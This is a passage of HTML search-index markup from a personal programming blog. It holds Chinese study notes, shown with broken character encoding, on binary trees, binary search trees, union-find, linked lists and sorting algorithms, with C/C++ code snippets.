            s.pop();
            printf(&amp;quot;%d &amp;quot;,tmp_node-&amp;gt;data);
            tmp_node = tmp_node-&amp;gt;rchild;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ååºè®¿é—®&#34;&gt;ååºè®¿é—®&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void postOrderTraveral(Bitree *node)
{
    if(node == NULL)
    {
        return;
    }
    postOrderTraveral(node-&amp;gt;lchild);
    postOrderTraveral(node-&amp;gt;rchild);
    printf(&amp;quot;%d &amp;quot;,node-&amp;gt;data);
}


void _postOrderTraveral(Bitree *node)
{
    stack&amp;lt;Bitree*&amp;gt; s;
    Bitree *tmp_node = node, *lastVisit = NULL;
    while(tmp_node!=NULL || !s.empty())
    {
        while(tmp_node != NULL) //å·¦èŠ‚ç‚¹å…¥æ ˆ
        {
            s.push(tmp_node);
            tmp_node = tmp_node-&amp;gt;lchild;
        }
        if(!s.empty())
        {
            tmp_node = s.top();
            s.pop();
            if(tmp_node-&amp;gt;rchild==NULL || tmp_node-&amp;gt;rchild==lastVisit) //æ­¤èŠ‚ç‚¹å³å­©å­ä¸ºç©ºæˆ–è€…å·²è®¿é—®è¿‡ï¼Œé‚£ä¹ˆè®¿é—®æ­¤èŠ‚ç‚¹
            {
                printf(&amp;quot;%d &amp;quot;,tmp_node-&amp;gt;data);
                lastVisit = tmp_node;
                tmp_node = NULL;
            }
            else
            {
                s.push(tmp_node);//å¦‚æœæœ‰å³å­©å­å¹¶ä¸”æ¯è®¿é—®è¿‡ï¼Œå†å°†æ­¤ç»“ç‚¹å…¥æ ˆ
                tmp_node = tmp_node-&amp;gt;rchild;
            }
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å±‚æ¬¡éå†&lt;br&gt;
äºŒå‰æ ‘çš„å±‚æ¬¡éå†åŸºäºå¹¿åº¦ä¼˜å…ˆæœç´¢ï¼Œ&lt;font color=&#39;red&#39;&gt;åœ¨è®¿é—®ç¬¬nå±‚æ—¶ï¼Œä¸€å®šä¼šè®¿é—®å®Œç¬¬n-1å±‚&lt;/font&gt;ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void levelOrder(Bitree *root)
{
    if(!root) return;
    queue&amp;lt;Bitree *&amp;gt; q;
    q.push(root);
    while(!q.empty())
    {
        Bitree tmp = q.front();
        q.pop();
        printf(&amp;quot;%d&amp;quot;,tmp-&amp;gt;data);
        if(tmp-&amp;gt;lchild) q.push(tmp.lchild);
        if(tmp-&amp;gt;rchild) q.push(tmp.rchild);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;0äºŒå‰æœç´¢æ ‘&#34;&gt;0äºŒå‰æœç´¢æ ‘&lt;/h2&gt;
&lt;p&gt;å·¦å­æ ‘çš„æ‰€æœ‰ç»“ç‚¹å€¼å‡å°äºæ ¹ç»“ç‚¹çš„å€¼ï¼›å³å­æ ‘çš„æ‰€æœ‰ç»“ç‚¹å€¼å‡å¤§äºæ ¹ç»“ç‚¹çš„å€¼ï¼›å·¦å­æ ‘ä¹Ÿæ˜¯äºŒå‰æœç´¢æ ‘ã€‚&lt;/p&gt;
&lt;h3 id=&#34;äºŒå‰æœç´¢æ ‘çš„æ„å»º&#34;&gt;äºŒå‰æœç´¢æ ‘çš„æ„å»º&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;typedef struct TreeNode
{
    int val;
    struct TreeNode *lchild, *rchild;
}TreeNode;

void Create(TreeNode *root, int tmp)
{
    if(!root)
    {
        root = (TreeNode *)malloc(sizeof(TreeNode));
        root-&amp;gt;val = tmp;
        return;
    }
    if(root-&amp;gt;val &amp;lt; tmp)
        Create(root-&amp;gt;lchild,tmp);
    else
        Create(root-&amp;gt;rchild,tmp);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;äºŒå‰æœç´¢æ ‘ç»“ç‚¹çš„åˆ é™¤&#34;&gt;äºŒå‰æœç´¢æ ‘ç»“ç‚¹çš„åˆ é™¤&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;å¦‚æœåˆ é™¤çš„ç»“ç‚¹åªæœ‰å·¦å­©å­æˆ–è€…åªæœ‰æœ‰å­©å­ï¼Œé‚£ä¹ˆç›´æ¥åˆ é™¤ï¼Œç„¶åæŠŠå…¶å­©å­åŠ åˆ°çˆ¶èŠ‚ç‚¹ä¸Šã€‚&lt;br&gt;
&lt;img src=&#34;https://cactusii.github.io//post-images/1600996986954.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;li&gt;å¦‚æœåˆ é™¤çš„ç»“ç‚¹æœ‰å·¦å­©å­å’Œæœ‰å­©å­ï¼Œé‚£ä¹ˆåˆ é™¤æ­¤èŠ‚ç‚¹åï¼Œéœ€è¦å°†å…¶å·¦å­æ ‘çš„æœ€å¤§ç»“ç‚¹æˆ–è€…å³å­æ ‘çš„æœ€å°èŠ‚ç‚¹æ›¿æ¢ä¸Šæ¥ã€‚&lt;img src=&#34;https://cactusii.github.io//post-images/1600997012992.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;æ‰¾åˆ°äºŒå‰æœç´¢æ ‘ä¸¤ä¸ªç»“ç‚¹çš„æœ€è¿‘çš„åŒäº²ç»“ç‚¹&#34;&gt;æ‰¾åˆ°äºŒå‰æœç´¢æ ‘ä¸¤ä¸ªç»“ç‚¹çš„æœ€è¿‘çš„åŒäº²ç»“ç‚¹&lt;/h3&gt;
&lt;p&gt;åˆ©ç”¨äºŒå‰æœç´¢æ ‘çš„ç‰¹ç‚¹ï¼Œéå†æ•´ä¸ªäºŒå‰æ ‘ï¼Œå¦‚æœä¸¤ä¸ªèŠ‚ç‚¹éƒ½å°äºå½“å‰éå†ç»“ç‚¹ï¼Œé‚£ä¹ˆé€’å½’åˆ°å…¶å·¦å­æ ‘ï¼›å¦‚æœä¸¤ä¸ªç»“ç‚¹éƒ½å¤§äºå½“å‰éå†ç»“ç‚¹ï¼Œé‚£ä¹ˆé€’å½’åˆ°å…¶å³å­æ ‘ä¸Šï¼Œå¦‚æœä¸€ä¸ªå¤§äºä¸€ä¸ªå°äºå½“å‰éå†ç»“ç‚¹ï¼Œé‚£ä¹ˆæ­¤ç»“ç‚¹å³ä¸ºå…¶æœ€è¿‘çš„åŒäº²ç»“ç‚¹ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) {
    if(root-&amp;gt;val &amp;gt; p-&amp;gt;val &amp;amp;&amp;amp; root-&amp;gt;val &amp;gt; q-&amp;gt;val)
        return lowestCommonAncestor(root-&amp;gt;left,p,q);
    else if (root-&amp;gt;val &amp;lt; p-&amp;gt;val &amp;amp;&amp;amp; root-&amp;gt;val &amp;lt; q-&amp;gt;val)
        return lowestCommonAncestor(root-&amp;gt;right,p,q);
    return root;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;äºŒå‰æœç´¢æ ‘çš„ä¸­åºéå†æ˜¯é€’å¢é¡ºåº&lt;/p&gt;
&lt;h2 id=&#34;ç”±ä¸­åºå’Œååºè¿˜åŸäºŒå‰æ ‘&#34;&gt;ç”±ä¸­åºå’Œååºè¿˜åŸäºŒå‰æ ‘&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;ååºä¸­å³èµ·ç¬¬ä¸€ä½3è‚¯å®šæ˜¯æ ¹ç»“ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥æ®æ­¤æ‰¾åˆ°ä¸­åºä¸­æ ¹ç»“ç‚¹çš„ä½ç½®rootinï¼›&lt;/li&gt;
&lt;li&gt;ä¸­åºä¸­æ ¹ç»“ç‚¹å·¦è¾¹å°±æ˜¯å·¦å­æ ‘ç»“ç‚¹ï¼Œå³è¾¹å°±æ˜¯å³å­æ ‘ç»“ç‚¹ï¼Œå³[å·¦å­æ ‘ç»“ç‚¹ï¼Œæ ¹ç»“ç‚¹ï¼Œå³å­æ ‘ç»“ç‚¹]ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—å‡ºå·¦å­æ ‘ç»“ç‚¹ä¸ªæ•°ä¸ºint left_count = tmp - inleft;ï¼›&lt;/li&gt;
&lt;li&gt;ååºä¸­ç»“ç‚¹åˆ†å¸ƒåº”è¯¥æ˜¯ï¼š[å·¦å­æ ‘ç»“ç‚¹ï¼Œå³å­æ ‘ç»“ç‚¹ï¼Œæ ¹ç»“ç‚¹]ï¼›&lt;/li&gt;
&lt;li&gt;æ ¹æ®å‰ä¸€æ­¥ç¡®å®šçš„å·¦å­æ ‘ä¸ªæ•°ï¼Œå¯ä»¥ç¡®å®šååºä¸­å·¦å­æ ‘ç»“ç‚¹å’Œå³å­æ ‘ç»“ç‚¹çš„èŒƒå›´ï¼›&lt;/li&gt;
&lt;li&gt;å¦‚æœæˆ‘ä»¬è¦å‰åºéå†ç”ŸæˆäºŒå‰æ ‘çš„è¯ï¼Œä¸‹ä¸€å±‚é€’å½’åº”è¯¥æ˜¯ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;å·¦å­æ ‘ï¼šroot-&amp;gt;left = pre_order(ä¸­åºå·¦å­æ ‘èŒƒå›´ï¼Œååºå·¦å­æ ‘èŒƒå›´ï¼Œä¸­åºåºåˆ—ï¼Œååºåºåˆ—);ï¼›&lt;/li&gt;
&lt;li&gt;å³å­æ ‘ï¼šroot-&amp;gt;right = pre_order(ä¸­åºå³å­æ ‘èŒƒå›´ï¼Œååºå³å­æ ‘èŒƒå›´ï¼Œä¸­åºåºåˆ—ï¼Œååºåºåˆ—);ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;æ¯ä¸€å±‚é€’å½’éƒ½è¦è¿”å›å½“å‰æ ¹ç»“ç‚¹rootï¼›&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;TreeNode* buildTree(vector&amp;lt;int&amp;gt;&amp;amp; inorder, vector&amp;lt;int&amp;gt;&amp;amp; postorder) {
    TreeNode *root = pre_order(0,inorder.size()-1, 0,postorder.size()-1, inorder, postorder);
    return root;
}

TreeNode *pre_order(int inleft, int inright, int postleft, int postright, vector&amp;lt;int&amp;gt; &amp;amp;inorder, vector&amp;lt;int&amp;gt;&amp;amp; postorder)
{
    if(inleft&amp;gt;inright) return NULL;
    TreeNode *root = new TreeNode(postorder[postright]);
    int tmp = inleft;
    while(inorder[tmp]!=postorder[postright]) tmp++;
    int left_count = tmp - inleft; //å·¦å­æ ‘çš„ç»“ç‚¹ä¸ªæ•°
    root-&amp;gt;left = pre_order(inleft,tmp-1,postleft,postleft+left_count-1,inorder,postorder);
    root-&amp;gt;right = pre_order(tmp+1,inright,postleft+left_count,postright-1,inorder,postorder);
    return root;
}
&lt;/code&gt;&lt;/pre&gt;
">ã€æ•°æ®ç»“æ„ã€‘äºŒå‰æ ‘</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/shu-ju-jie-gou-bing-cha-ji/"" data-c="
          &lt;p&gt;å¹¶æŸ¥é›†ä¸»è¦ç”¨äºå¤„ç†ä¸€äº›ä¸ç›¸äº¤é›†åˆçš„é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;æ¯ä¸ªé›†åˆåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ªä»£è¡¨å…ƒç´ ã€‚å¯¹äºç»™å®šä¸€ä¸ªå…ƒç´ ï¼Œå¯ä»¥å¿«é€Ÿæ‰¾åˆ°å…¶æ‰€å±é›†åˆçš„ä»£è¡¨å…ƒç´ ï¼Œè¿™æ ·åˆ¤æ–­ä¸¤ä¸ªå…ƒç´ æ˜¯å¦å±äºåŒä¸€é›†åˆï¼Œåªéœ€è¦åˆ¤æ–­äºŒè€…æ‰€å±é›†åˆçš„ä»£è¡¨å…ƒç´ æ˜¯å¦ä¸€è‡´å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœè¦åˆå¹¶ä¸¤ä¸ªé›†åˆï¼Œåªéœ€è¦å°†å…¶ä¸­ä¸€ä¸ªé›†åˆçš„ä»£è¡¨å…ƒç´ è®¾ä¸ºå¦ä¸€ä¸ªé›†åˆçš„ä»£è¡¨å…ƒç´ å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;å³ï¼Œå¹¶æŸ¥é›†ä¸»è¦åº”ç”¨äºä¸¤ä¸ªæ“ä½œï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å°†ä¸¤ä¸ªé›†åˆåˆå¹¶&lt;/li&gt;
&lt;li&gt;æŸ¥è¯¢ä¸¤ä¸ªå…ƒç´ æ˜¯å¦å±äºåŒä¸€ä¸ªé›†åˆ&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;æ¶‰åŠåˆ°çš„ä¸»è¦æ“ä½œæœ‰ä¸¤ä¸ª&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;åˆå¹¶ï¼šæŠŠä¸¤ä¸ªå…ƒç´ æ‰€å±é›†åˆåˆå¹¶ï¼ˆå‰ææ˜¯ä¸¤ä¸ªé›†åˆä¸ç›¸äº¤ï¼‰&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void join(int a, int b)
{
    int tmpa,tmpb;
    tmpa = find_root(a);
    tmpb = find_root(b);
    if(tmpa!=tmpb)
        root[tmpa] = tmpb;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;æŸ¥æ‰¾æ ¹ï¼ˆä»£è¡¨å…ƒç´ ï¼‰ï¼šæ‰¾åˆ°æŸä¸€ä¸ªå…ƒç´ çš„æ‰€å±é›†åˆçš„æ ¹ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int find_root(int x)
{
    while(x!=root[x])
        x = root[x];
    return x;
}

//root[x]=yè¡¨ç¤ºxçš„æ ¹æ˜¯yï¼Œåˆå§‹åŒ–æ—¶ï¼Œæ¯ä¸ªå…ƒç´ çš„æ ¹éƒ½æ˜¯è‡ªå·±
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;è·¯å¾„å‹ç¼©&lt;/strong&gt;*&lt;br&gt;
æŸ¥æ‰¾æ ¹æœ€åçš„ä¸€ç§æƒ…å†µæ˜¯ä¸€æ¡å¸¸å¸¸çš„é“¾ï¼Œè¿™æ—¶å€™æŸ¥æ‰¾çš„æ•ˆç‡ä¼šå¤§å¤§é™ä½ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨è·¯å¾„å‹ç¼©ï¼Œå³å°†æ¯ä¸ªå…ƒç´ ç›´æ¥æŒ‡å‘æ ¹èŠ‚ç‚¹ ï¼Œå¦‚ä¸‹å›¾ã€‚&lt;br&gt;
&lt;img src=&#34;https://cactusii.github.io//post-images/1600744618773.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥åœ¨æŸ¥æ‰¾çš„è¿‡ç¨‹ä¸­æŠŠæ¯ä¸ªå…ƒç´ çš„çˆ¶èŠ‚ç‚¹ç›´æ¥è®¾æˆæ ¹èŠ‚ç‚¹ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int find_root(int x)
{
    int root_of_x = x; //æ ¹èŠ‚ç‚¹
   
   // æ‰¾åˆ°xçš„æ ¹èŠ‚ç‚¹
    while(root_of_x != root[root_of_x])
        root_of_x = root[root_of_x];
    
    //å°†xåˆ°root_of_xè·¯å¾„ä¸Šçš„æ¯ä¸ªèŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹éƒ½æ¢æˆæ ¹èŠ‚ç‚¹xçš„æ ¹èŠ‚ç‚¹
    while(x != root[x]) 
    {
        int tmp = x;
        x = root[x];
        root[tmp] = root_of_x;
    }
    return root_of_x;
}
&lt;/code&gt;&lt;/pre&gt;
">ã€æ•°æ®ç»“æ„ã€‘å¹¶æŸ¥é›†</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/shu-ju-jie-gou-lian-biao-de-cun-chu/"" data-c="
          &lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1600735871236.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;å®šä¹‰é“¾è¡¨ç»“æ„ä½“&#34;&gt;å®šä¹‰é“¾è¡¨ç»“æ„ä½“&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;typedef struct ListNode
{
    int val;
    struct ListNode *next;
}ListNode;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;éå†é“¾è¡¨&#34;&gt;éå†é“¾è¡¨&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void print(ListNode *head)
{
    for(ListNode *cursor = head; cursor; cursor = cursor-&amp;gt;next)
    {
        printf(&amp;quot;%d-&amp;gt;&amp;quot;,cursor-&amp;gt;val);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;å°¾éƒ¨æ’å…¥&#34;&gt;å°¾éƒ¨æ’å…¥&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void lpush_back(ListNode *head, int val)
{
    ListNode *node = (ListNode*)malloc(sizeof(ListNode));
    ListNode *cursor = head;
    node-&amp;gt;val = val;
    while(cursor-&amp;gt;next) cursor = cursor-&amp;gt;next;
    cursor-&amp;gt;next = node;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;å¤´éƒ¨æ’å…¥&#34;&gt;å¤´éƒ¨æ’å…¥&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void lpush_front(ListNode **head, int val)
{
    ListNode *node = (ListNode*)malloc(sizeof(ListNode));
    node-&amp;gt;val = val;
    node-&amp;gt;next =*head;
    *head = node;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;å¤´éƒ¨åˆ é™¤&#34;&gt;å¤´éƒ¨åˆ é™¤&lt;/h2&gt;
&lt;h2 id=&#34;åˆ é™¤æŒ‡å®šèŠ‚ç‚¹&#34;&gt;åˆ é™¤æŒ‡å®šèŠ‚ç‚¹&lt;/h2&gt;
">ã€æ•°æ®ç»“æ„ã€‘é“¾è¡¨çš„å­˜å‚¨</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/pai-xu-suan-fa/"" data-c="
          &lt;p&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1600700055304.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://cactusii.github.io//post-images/1620640106953.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;ç¨³å®šæ’åº&#34;&gt;ç¨³å®šæ’åº&lt;/h2&gt;
&lt;h3 id=&#34;1ç›´æ¥æ’å…¥æ’åº-on2&#34;&gt;1.ç›´æ¥æ’å…¥æ’åº &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;O(n^{2})&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.064108em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void insSort(int *arr,int n)
{
    for(int i=0;i&amp;lt;n;i++)
    {
        int tmp=arr[i];
        int j=i-1;
        while(j&amp;gt;=0&amp;amp;&amp;amp;tmp&amp;lt;arr[j])
        {
            arr[j+1]=arr[j];
            j--;
        }
        arr[j+1]=tmp;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;2å†’æ³¡æ’åº-on2&#34;&gt;2.å†’æ³¡æ’åº &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;O(n^{2})&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.064108em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void bubSort(int *arr,int n)
{
    for(int i=0;i&amp;lt;n;i++)
        for(int j=0;j&amp;lt;n-i-1;j++)
            if(arr[j]&amp;gt;arr[j+1])
                swap(arr[j],arr[j+1]);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;3äºŒè·¯å½’å¹¶æ’åº&#34;&gt;3.äºŒè·¯å½’å¹¶æ’åº&lt;/h3&gt;
&lt;p&gt;æŒ‰ç…§åˆ†æ²»æ€æƒ³ï¼Œå°†åºåˆ—åˆ†ä¸ºè‹¥å¹²å­åºåˆ—ï¼Œå­åºåˆ—æœ‰åºï¼Œç„¶åå†å°†å­åºåˆ—åˆå¹¶ä¸ºæ•´ä½“æœ‰åºåºåˆ—ã€‚&lt;/p&gt;
&lt;p&gt;å¤§æ¦‚çš„æ­¥éª¤æ˜¯ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç¡®å®šåˆ†ç•Œç‚¹&lt;code&gt;mid = (l + r) / 2&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;é€’å½’æ’åºå·¦åŠè¾¹&lt;code&gt;left&lt;/code&gt;ï¼Œå³åŠè¾¹&lt;code&gt;right&lt;/code&gt;ï¼›&lt;/li&gt;
&lt;li&gt;å½’å¹¶ï¼Œå°†ä¸¤ä¸ªæ•°ç»„åˆäºŒä¸ºä¸€ã€‚*(åˆ©ç”¨åˆ°äº†åŒæŒ‡é’ˆ)&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int tmp[N];

void merge_sort(int *arr, int l, int r)
{
    if(l &amp;gt;= r) return;
    
    int mid = l + (r - l) / 2;
    
    merge_sort(arr, l, mid);
    merge_sort(arr, mid + 1, r);
    
    int k = 0, i = l, j = mid + 1;
    
    while(i &amp;lt;= mid &amp;amp;&amp;amp; j &amp;lt;= r)
        if(arr[i] &amp;lt;= arr[j]) tmp[k++] = arr[i++];
        else tmp[k++] = arr[j++];

    while(i &amp;lt;= mid) tmp[k++] = arr[i++];
    while(j &amp;lt;= r) tmp[k++] = arr[j++];
    
    for(int i = l; i &amp;lt;= r; i++)
        arr[i] = tmp[i - l];
}


&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;4åŸºæ•°æ’åº&#34;&gt;4.åŸºæ•°æ’åº&lt;/h3&gt;
&lt;p&gt;æ¡¶å­æ’åºï¼ŒæŒ‰ç…§åŸºæ•°å¯¹æ•´ä¸ªåºåˆ—è¿›è¡Œå¤šæ¬¡çš„æ’åºã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä¸ç¨³å®šæ’åº&#34;&gt;ä¸ç¨³å®šæ’åº&lt;/h2&gt;
&lt;h3 id=&#34;5é€‰æ‹©æ’åº&#34;&gt;5.é€‰æ‹©æ’åº&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void selSort(int *arr,int n)
{
    for(int i=0;i&amp;lt;n;i++)
    {
        int MIN_index = i;
        for(int j=i;j&amp;lt;n;j++)
            if(arr[MIN_index]&amp;gt;arr[j]) MIN_index=j;
        swap(arr[MIN_index],arr[i]);
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;6å¿«é€Ÿæ’åº&#34;&gt;6.å¿«é€Ÿæ’åº&lt;/h3&gt;
&lt;p&gt;åˆ†æ²»ã€‚&lt;/p&gt;
&lt;p&gt;å¤§æ¦‚åˆ†ä¸ºä»¥ä¸‹æ­¥éª¤ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ç¡®å®šåˆ†ç•Œç‚¹&lt;code&gt;x&lt;/code&gt;ï¼š&lt;code&gt;arr[l]&lt;/code&gt; &lt;code&gt;arr[(l+r)/2]&lt;/code&gt; &lt;code&gt;q[r]&lt;/code&gt;éƒ½æ˜¯å¯ä»¥çš„ï¼›&lt;/li&gt;
&lt;li&gt;è°ƒæ•´åŒºé—´ï¼Œä½¿å¾—&lt;code&gt;x&lt;/code&gt;å·¦è¾¹éƒ½æ˜¯å°äºç­‰äº&lt;code&gt;x&lt;/code&gt;ï¼Œå³è¾¹éƒ½æ˜¯å¤§äº&lt;code&gt;x&lt;/code&gt;ï¼›&lt;/li&gt;
&lt;li&gt;é€’å½’å¤„ç†å·¦å³ä¸¤ç«¯ã€‚&lt;/li&gt;
&lt;/ol&gt;
